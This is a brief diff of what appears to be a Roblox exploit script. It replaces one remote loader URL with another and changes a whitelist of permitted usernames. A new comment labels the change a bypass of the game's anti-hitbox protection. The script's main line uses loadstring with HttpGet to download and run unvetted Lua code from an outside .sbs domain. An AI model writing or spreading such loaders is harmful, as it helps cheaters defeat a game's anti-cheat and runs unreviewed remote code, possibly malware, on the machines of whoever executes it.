@@ -1,6 +1,7 @@
-loadstring(game:HttpGet("https://plsrandomname.sbs/loaders/discordx2swnz.lua"))()
+-- # bypass anti hitbox cdvn
+loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
    local allowedUsers = {
-    ["phubentau"] = true,
+    ["meobysl"] = true,
     ["anhtthuc03"] = true
 }
 local currentUserName = game.Players.LocalPlayer.Name
